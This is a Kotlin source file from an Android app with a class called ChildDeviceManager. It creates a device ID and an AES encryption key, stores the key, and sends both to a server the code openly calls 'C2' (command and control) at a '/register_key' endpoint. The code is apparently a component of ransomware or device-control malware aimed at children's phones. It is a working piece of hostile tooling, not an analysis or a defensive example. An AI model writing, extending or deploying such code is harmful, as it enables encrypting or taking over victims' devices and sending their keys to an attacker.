package com.sadap.bocahapp

import android.content.Context
import android.util.Log
import com.sadap.template.crypto.EncryptionUtils
import com.sadap.template.network.C2Client
import com.sadap.template.utils.AppConstants
import org.json.JSONObject
import java.security.Key
import java.util.UUID

class ChildDeviceManager(private val context: Context) {

    private val sharedPrefs = context.getSharedPreferences(AppConstants.PREFS_NAME, Context.MODE_PRIVATE)

    fun getDeviceId(): String {
        var deviceId = sharedPrefs.getString(AppConstants.DEVICE_ID_KEY, null)
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            sharedPrefs.edit().putString(AppConstants.DEVICE_ID_KEY, deviceId).apply()
            Log.d("ChildDeviceManager", "Generated new device ID: $deviceId")
        } else {
            Log.d("ChildDeviceManager", "Using existing device ID: $deviceId")
        }
        return deviceId
    }

    fun getEncryptionKey(): Key? {
        val keyBase64 = sharedPrefs.getString(AppConstants.ENCRYPTION_KEY_STORAGE, null)
        return if (keyBase64 != null) {
            EncryptionUtils.base64ToKey(keyBase64)
        } else {
            null
        }
    }

    fun generateAndStoreKey(): Key {
        val newKey = EncryptionUtils.generateAESKey()
        val keyBase64 = EncryptionUtils.keyToBase64(newKey)
        sharedPrefs.edit().putString(AppConstants.ENCRYPTION_KEY_STORAGE, keyBase64).apply()
        Log.d("ChildDeviceManager", "Generated and stored new encryption key locally.")
        return newKey
    }

    fun sendKeyToC2(key: Key) {
        val deviceId = getDeviceId()
        val keyBase64 = EncryptionUtils.keyToBase64(key)
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("encryption_key", keyBase64)
        }
        val response = C2Client.post("/register_key", json)
        if (response != null && response.contains("terdaftar")) {
            Log.d("ChildDeviceManager", "Key sent to C2 successfully.")
        } else {
            Log.e("ChildDeviceManager", "Failed to send key to C2: $response")
        }
    }
}
